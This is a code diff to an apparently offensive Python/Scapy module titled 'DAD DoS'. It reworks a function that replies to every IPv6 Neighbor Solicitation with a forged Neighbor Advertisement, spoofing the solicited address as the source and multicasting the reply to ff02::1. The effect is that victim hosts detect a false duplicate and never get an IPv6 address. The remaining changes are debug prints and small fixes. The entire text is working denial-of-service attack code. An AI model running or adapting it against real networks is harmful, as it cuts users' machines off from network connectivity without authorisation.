@@ -14,10 +14,6 @@ class IPv6Module(Template):
         self.modname = "DAD DoS"
         self.actions = [
             {
-                "title": "DAD DoS",
-                "action": "action",
-            },
-            {
                 "title": "Start DAD DoS",
                 "action": "action"
             },
@@ -87,26 +83,32 @@ class IPv6Sniffer:
                 #print e
 
     def DAD_DoS(self, packet, dst=get_source_address(IPv6(dst="ff02::1"))):
+        tgt = packet[ICMPv6ND_NS].fields["tgt"]
+
         ip_packet = createIPv6()
         ip_packet.fields["nh"] = 58 #ICMPv6
         ip_packet.fields["hlim"] = 255
-        ip_packet.fields["dst"] = dst
+        ip_packet.fields["src"] = tgt
+        ip_packet.fields["dst"] = "ff02::1"
 
-        if packet[IPv6].src != "::":
-            packet[IPv6].fields["dst"] = packet[IPv6].src
-
-
-        tgt = packet[ICMPv6ND_NS].fields["tgt"]
+        #if packet[IPv6].src != "::":
+        #    packet[IPv6].fields["dst"] = packet[IPv6].src
 
         advertisement = ICMPv6ND_NA()
         advertisement.fields["R"] = 0
-        advertisement.fields["S"] = 1
+        advertisement.fields["S"] = 0
         advertisement.fields["O"] = 1
+        advertisement.fields["tgt"] = tgt
         
         options = ICMPv6NDOptSrcLLAddr()
         options.fields["lladdr"] = [get_if_hwaddr(i) for i in get_if_list()][0]
 
+        print ip_packet.show()
+        print advertisement.show()
+        print options.show()
+
+
         send(ip_packet/advertisement/options)
-        out = "DAD_DoS: Overriding IPv6 Neighbor Solicitation: %s  Packet sent to %s" % (tgt)
+        out = "DAD_DoS: Overriding IPv6 Neighbor Solicitation: %s" % (tgt)
         self.mod.socket_log(out)
         print out
